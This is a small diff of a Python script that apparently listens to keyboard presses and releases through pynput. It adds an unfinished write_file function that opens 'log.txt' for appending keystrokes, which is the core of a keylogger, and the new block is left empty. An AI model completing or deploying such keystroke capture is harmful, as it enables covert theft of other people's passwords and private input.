@@ -15,6 +15,8 @@ def on_release(key):
         return False
 
 def write_file():
+    with open('log.txt', 'a') as f:
+        
 
 
 with Listener(on_press =on_press, on_release=on_release) as listener:
